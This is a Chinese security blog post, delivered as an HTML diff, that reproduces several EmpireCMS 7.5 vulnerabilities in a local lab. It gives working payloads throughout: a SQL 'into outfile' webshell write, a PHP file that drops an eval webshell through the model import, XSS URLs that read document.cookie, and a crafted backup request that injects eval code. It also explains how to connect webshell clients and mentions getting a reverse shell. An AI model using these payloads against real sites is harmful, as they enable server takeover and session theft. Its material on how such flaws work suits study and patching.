@@ -1,0 +1,1315 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="/themes/next/languages/zh-Hans.yml">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="安全,复现,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="帝国">
+<meta name="keywords" content="安全,复现">
+<meta property="og:type" content="article">
+<meta property="og:title" content="帝国cms漏洞整理">
+<meta property="og:url" content="https://bjj.dropsec.xyz/2020/11/25/帝国cms漏洞整理/index.html">
+<meta property="og:site_name" content="AJay13">
+<meta property="og:description" content="帝国">
+<meta property="og:locale" content="/themes/next/languages/zh-Hans.yml">
+<meta property="og:image" content="https://raw.githubusercontent.com/Hatcat123/GraphicBed/master/Img2/20201125092811.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Hatcat123/GraphicBed/master/Img2/20201125142419.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Hatcat123/GraphicBed/master/Img2/20201125143830.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Hatcat123/GraphicBed/master/Img2/20201125144033.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Hatcat123/GraphicBed/master/Img2/20201125145204.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Hatcat123/GraphicBed/master/Img2/20201125171319.png">
+<meta property="og:updated_time" content="2020-12-13T05:48:48.401Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="帝国cms漏洞整理">
+<meta name="twitter:description" content="帝国">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Hatcat123/GraphicBed/master/Img2/20201125092811.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://bjj.dropsec.xyz/2020/11/25/帝国cms漏洞整理/">
+
+
+
+
+
+  <title>帝国cms漏洞整理 | AJay13</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="/themes/next/languages/zh-Hans.yml">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+<a href="https://github.com/Hatcat123" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewbox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; left: 0; transform: scale(-1, 1);" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style></a>
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">AJay13</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description"></h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-首页">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home  //首页"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-标签">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags  //标签"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-分类">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th   //分类"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-归档">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive //归档"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-微信聚合">
+          <a href="http:wechat.doonsec.com/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-wechat //知识库"></i> <br>
+            
+            微信聚合
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-安全导航">
+          <a href="/sec_web" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-google //安全导航"></i> <br>
+            
+            安全导航
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-关于">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user  //关于"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="Searching..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://bjj.dropsec.xyz/2020/11/25/帝国cms漏洞整理/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="朴阿杰">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="AJay13">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">帝国cms漏洞整理</h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-11-25T21:09:05+08:00">
+                2020-11-25
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/安全/" itemprop="url" rel="index">
+                    <span itemprop="name">安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  1.5k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time &asymp;</span>
+                
+                <span title="Reading time">
+                  6
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>帝国<br><a id="more"></a></p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>下载phpstudy 默认安装帝国cms7.5版本。一键搭建，然后默认地址为<a href="http://www.diguo.com/e/admin/" target="_blank" rel="noopener">http://www.diguo.com/e/admin/</a> 账号密码admin/admin</p>
+<h2 id="帝国CMS-EmpireCMS-v7-5-代码注入分析-CVE-2018-19462"><a href="#帝国CMS-EmpireCMS-v7-5-代码注入分析-CVE-2018-19462" class="headerlink" title="帝国CMS(EmpireCMS) v7.5 代码注入分析(CVE-2018-19462)"></a>帝国CMS(EmpireCMS) v7.5 代码注入分析(CVE-2018-19462)</h2><p>mpireCMS7.5及之前版本中的admindbDoSql.php文件存在代码注入漏洞。该漏洞源于外部输入数据构造代码段的过程中,网路系统或产品未正确过滤其中的特殊元素。攻击者可利用该漏洞生成非法的代码段,修改网络系统或组件的预期的执行控制流。</p>
+<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>登陆后台，在系统-执行SQL语句中执行sql命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &apos;&lt;?php @eval($_POST[aaaa])?&gt;&apos; into outfile &apos;C:/phpstudy_pro/WWW/www.diguo.com/shell.php&apos;</span><br></pre></td></tr></table></figure>
+<p>显示执行成功，执行失败看下失败的原因，主要是在mysql上的原因。</p>
+<p>如果文件存在 不能覆盖<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">File &apos;C:/phpstudy_pro/WWW/upload/upload/shell.php&apos; already exists</span><br><span class="line">select &apos;&apos; into outfile &apos;C:/phpstudy_pro/WWW/upload/upload/shell.php&apos;</span><br></pre></td></tr></table></figure></p>
+<p>如果路径不对</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Can&apos;t create/write to file &apos;C:\phpstudy_pro\WW1W\upload\upload\shell.php&apos; (Errcode: 2 - No such file or directory)</span><br><span class="line">select &apos;&apos; into outfile &apos;C:/phpstudy_pro/WW1W/upload/upload/shell.php&apos;</span><br></pre></td></tr></table></figure>
+<h2 id="连接webshell"><a href="#连接webshell" class="headerlink" title="连接webshell"></a>连接webshell</h2><h3 id="菜刀连接"><a href="#菜刀连接" class="headerlink" title="菜刀连接"></a>菜刀连接</h3><p>第一次使用菜刀没有连接上，但是webshell能访问。</p>
+<h3 id="蚁剑连接"><a href="#蚁剑连接" class="headerlink" title="蚁剑连接"></a>蚁剑连接</h3><p>蚁剑连接编码器选择base64，解码器也选base64。这样成功率高些</p>
+<h3 id="冰蝎连接"><a href="#冰蝎连接" class="headerlink" title="冰蝎连接"></a>冰蝎连接</h3><p>刚开始很奇怪，冰蝎怎么连接都连不上，然后多下了几个版本的php。开始使用冰蝎连接，nice连上了。</p>
+<p>验证了一下 php5.2版本的好像连接不上。<br>有时候解析失败了还是可以连接。</p>
+<p>还没想好冰蝎的马怎么写进入。只会写一句话的。目前的方式是使用菜刀小马然后上传冰蝎马，然后反弹shell。</p>
+<p>绕过的坑，sql执行的权限要高，否则不能写入shell文件。知道网站的路径。</p>
+<p>和php的版本也有关系，版本在7.3以上菜刀就连接不上了。使用蚁剑可以连接。</p>
+<h2 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h2><p>这里面讲解了漏洞的出现的方式<br><a href="https://blog.catgames.cn/post/112.html" target="_blank" rel="noopener">https://blog.catgames.cn/post/112.html</a><br><a href="https://www.cnblogs.com/yuzly/archive/2004/01/13/11353929.html" target="_blank" rel="noopener">https://www.cnblogs.com/yuzly/archive/2004/01/13/11353929.html</a></p>
+<h2 id="帝国CMS-EmpireCMS-v7-5后台getshell分析-CVE-2018-18086"><a href="#帝国CMS-EmpireCMS-v7-5后台getshell分析-CVE-2018-18086" class="headerlink" title="帝国CMS(EmpireCMS) v7.5后台getshell分析(CVE-2018-18086)"></a>帝国CMS(EmpireCMS) v7.5后台getshell分析(CVE-2018-18086)</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>EmpireCMS 7.5版本及之前版本在后台备份数据库时,未对数据库表名做验证,通过修改数据库表名可以实现任意代码执行。EmpireCMS7.5版本中的/e/class/moddofun.php文件的”LoadInMod”函数存在安全漏洞,攻击者可利用该漏洞上传任意文件。</p>
+<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>EmpireCMS&lt;=7.5</p>
+<h3 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>沿用phpstudy的部署环境</p>
+<h3 id="复现过程-1"><a href="#复现过程-1" class="headerlink" title="复现过程"></a>复现过程</h3><p>进入到后台-系统-数据表雨系统模型-管理数据表-导入数据模型</p>
+<p><img src="https://raw.githubusercontent.com/Hatcat123/GraphicBed/master/Img2/20201125092811.png" alt="20201125092811"></p>
+<p>上传木马模型<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php file_put_contents(&quot;caidao.php&quot;,&quot;&lt;?php @eval(\$_POST[cmd]); ?&gt;&quot;);?&gt;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/Hatcat123/GraphicBed/master/Img2/20201125142419.png" alt="20201125142419"></p>
+<p>路径为：<br><a href="http://www.diguo.com/e/admin/caidao.php" target="_blank" rel="noopener">http://www.diguo.com/e/admin/caidao.php</a></p>
+<p>菜刀与蚁剑连接</p>
+<h2 id="EmpireCMS-7-5-前台xss"><a href="#EmpireCMS-7-5-前台xss" class="headerlink" title="EmpireCMS 7.5 前台xss"></a>EmpireCMS 7.5 前台xss</h2><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>该漏洞是由于javascript获取url的参数,没有经过任何过滤,直接当作a标签和img标签的href属性和src属性输出。</p>
+<h3 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><p>EmpireCMS 7.5</p>
+<h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><p>需要开启会员空间功能(默认关闭),登录后台开启会员空间功能<br>登录后台-点击系统-系统参数设置-用户设置-开启会员空间</p>
+<p><img src="https://raw.githubusercontent.com/Hatcat123/GraphicBed/master/Img2/20201125143830.png" alt="20201125143830"></p>
+<p>payload：<br>javascript:alert(document.cookie)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.diguo.com/e/ViewImg/index.html?url=javascript:alert(/xss/)</span><br></pre></td></tr></table></figure></p>
+<p>点击图片放大 弹出xss</p>
+<p><img src="https://raw.githubusercontent.com/Hatcat123/GraphicBed/master/Img2/20201125144033.png" alt="20201125144033"></p>
+<p>菜鸟的我还不知道如果放大xss的危害。</p>
+<h2 id="EmpireCMS-7-5-后台xss"><a href="#EmpireCMS-7-5-后台xss" class="headerlink" title="EmpireCMS 7.5 后台xss"></a>EmpireCMS 7.5 后台xss</h2><h3 id="漏洞简介-1"><a href="#漏洞简介-1" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>该漏洞是由于代码只使用htmlspecialchars进行实体编码过滤,而且参数用的是ENT_QUOTES(编码双引号和单引号),还有addslashes函数处理,但是没有对任何恶意关键字进行过滤,从而导致攻击者使用别的关键字进行攻击。</p>
+<h3 id="漏洞影响-1"><a href="#漏洞影响-1" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><p>EmpireCMS 7.5</p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.diguo.com/e/admin/openpage/AdminPage.php?mainfile=javascript:alert(/xss/)</span><br></pre></td></tr></table></figure>
+<p>提示非法来源</p>
+<p><img src="https://raw.githubusercontent.com/Hatcat123/GraphicBed/master/Img2/20201125145204.png" alt="20201125145204"></p>
+<p>缺少参数，缺少参数去后台首页找到<code>ehash_ho28t=3UDcxRasb3N97RyFArXK</code></p>
+<p><a href="http://www.diguo.com/e/admin/openpage/AdminPage.php?ehash_f9Tj7=ZMhwowHjtSwqyRuiOylK&amp;mainfile=javascript:alert(/xss/)" target="_blank" rel="noopener">http://www.diguo.com/e/admin/openpage/AdminPage.php?ehash_f9Tj7=ZMhwowHjtSwqyRuiOylK&amp;mainfile=javascript:alert(/xss/)</a><br><a href="http://www.diguo.com/e/admin/openpage/AdminPage.php?ehash_f9Tj7=ZMhwowHjtSwqyRuiOylK&amp;mainfile=javascript:alert(document.cookie)" target="_blank" rel="noopener">http://www.diguo.com/e/admin/openpage/AdminPage.php?ehash_f9Tj7=ZMhwowHjtSwqyRuiOylK&amp;mainfile=javascript:alert(document.cookie)</a></p>
+<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.shuzhiduo.com/A/ZOJPejMP5v/" target="_blank" rel="noopener">https://www.shuzhiduo.com/A/ZOJPejMP5v/</a></p>
+<h2 id="帝国CMS-EmpireCMS-v7-5后台备份数据库任意代码执行"><a href="#帝国CMS-EmpireCMS-v7-5后台备份数据库任意代码执行" class="headerlink" title="帝国CMS(EmpireCMS) v7.5后台备份数据库任意代码执行"></a>帝国CMS(EmpireCMS) v7.5后台备份数据库任意代码执行</h2><h3 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>EmpireCMS 7.5版本及之前版本在后台备份数据库时,未对数据库表名做验证,通过修改数据库表名可以实现任意代码执行。</p>
+<h3 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h3><p>EmpireCMS&lt;=7.5</p>
+<h3 id="环境搭建-2"><a href="#环境搭建-2" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>同上</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>点击 系统-备份数据-选择数据库-开始备份<br><img src="https://raw.githubusercontent.com/Hatcat123/GraphicBed/master/Img2/20201125171319.png" alt="20201125171319"></p>
+<p>备份路径为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\phpstudy_pro\WWW\www.diguo.com\e\admin\ebak\bdata\www_diguo_com_20201125162930VPDqZW</span><br></pre></td></tr></table></figure></p>
+<p>config.php的内容为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$b_table=&quot;phome_enewszttype&quot;;</span><br><span class="line">	$tb[phome_enewszttype]=1;</span><br><span class="line"></span><br><span class="line">	$b_baktype=0;</span><br><span class="line">	$b_filesize=300;</span><br><span class="line">	$b_bakline=500;</span><br><span class="line">	$b_autoauf=1;</span><br><span class="line">	$b_dbname=&quot;www_diguo_com&quot;;</span><br><span class="line">	$b_stru=1;</span><br><span class="line">	$b_strufour=0;</span><br><span class="line">	$b_dbchar=&quot;utf8&quot;;</span><br><span class="line">	$b_beover=0;</span><br><span class="line">	$b_insertf=&quot;replace&quot;;</span><br><span class="line">	$b_autofield=&quot;,,&quot;;</span><br><span class="line">	$b_bakdatatype=1;</span><br><span class="line">	?&gt;</span><br></pre></td></tr></table></figure>
+<p>phome_enewszttype 替换成phpinfo()，访问config路径便能查看config信息</p>
+<p>使用bps抓包。点击备份，抓包。修改tablename的名字为php的信息。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /e/admin/ebak/phome.php HTTP/1.1</span><br><span class="line">Host: www.diguo.com</span><br><span class="line">Content-Length: 489</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">……</span><br><span class="line"></span><br><span class="line">ehash_e02b=37bded748e4584386415&amp;rhash_c4a2=bdd19c4088ce&amp;ehash_ho28t=3UDcxRasb3N97RyFArXK&amp;ehash_5e03=e326dc43088d24d93327&amp;rhash_264d=0d50e04c4c6a&amp;rhash_J2s9U=9n2e91ZQZ5p0&amp;ehash_6c2b=3e8ae51b0105e3b2e41e&amp;phome=DoEbak&amp;mydbname=www_diguo_com&amp;baktype=0&amp;filesize=300&amp;bakline=500&amp;autoauf=1&amp;bakstru=1&amp;dbchar=utf8&amp;bakdatatype=1&amp;mypath=www_diguo_com_20201125164337jHfvU5&amp;insertf=replace&amp;waitbaktime=0&amp;readme=&amp;autofield=&amp;tablename%5B%5D=@eval($_POST[1234])&amp;Submit=%E5%BC%80%E5%A7%8B%E5%A4%87%E4%BB%BD</span><br></pre></td></tr></table></figure>
+<p>提交后成功返回数据：查看到文件的路径<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">初使化备份成功，正在进入表备份．．．．．．&lt;script&gt;self.location.href=&apos;phome.php?phome=BakExe&amp;t=0&amp;s=0&amp;p=0&amp;mypath=www_diguo_com_20201125164337jHfvU5&amp;waitbaktime=0&amp;ehash_ho28t=3UDcxRasb3N97RyFArXK&amp;rhash_J2s9U=9n2e91ZQZ5p0&apos;;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<p>然后使用蚁剑连接，访问config.php<br><a href="http://www.diguo.com/e/admin/ebak/bdata/www_diguo_com_20201125164337jHfvU5/config.php" target="_blank" rel="noopener">http://www.diguo.com/e/admin/ebak/bdata/www_diguo_com_20201125164337jHfvU5/config.php</a></p>
+<h3 id="参考连接-1"><a href="#参考连接-1" class="headerlink" title="参考连接"></a>参考连接</h3><p><a href="https://www.cnblogs.com/yuzly/p/11369770.html" target="_blank" rel="noopener">https://www.cnblogs.com/yuzly/p/11369770.html</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/安全/" rel="tag" class=" fa  fa-tag  "> 安全</a>
+          
+            <a href="/tags/复现/" rel="tag" class=" fa  fa-tag  "> 复现</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/11/19/AWD整理记录/" rel="next" title="AWD整理记录">
+                <i class="fa fa-chevron-left"></i> AWD整理记录
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/11/25/渗透笔记总结/" rel="prev" title="渗透笔记总结">
+                渗透笔记总结 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">朴阿杰</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">127</span>
+                  <span class="site-state-item-name">文章</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">25</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">68</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+	<br>
+<br>
+<div class="site-state-item site-state-posts" style="border-left:none;">
+       <span class="site-state-item-count" id="busuanzi_value_site_pv"></span>
+       <span class="site-state-item-name">浏览量</span>
+</div>
+<div class="site-state-item site-state-posts">
+      <span class="site-state-item-count" id="busuanzi_value_site_uv"></span>
+     <span class="site-state-item-name">访客量</span>
+</div>
+<div class="site-state-item site-state-posts">
+      <span class="site-state-item-count">129.7k</span>
+      <span class="site-state-item-name">总字数</span>
+</div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/DropsDevopsOrg" target="_blank" title="团队GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>团队GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="http://www.dropsec.xyz/" target="_blank" title="团队主页">
+                      
+                        <i class="fa fa-fw fa-dropsec"></i>团队主页</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/DropsOfZut/awesome-security-weixin-official-accounts" target="_blank" title="安全公众号">
+                      
+                        <i class="fa fa-fw fa-xx"></i>安全公众号</a>
+                  </span>
+                
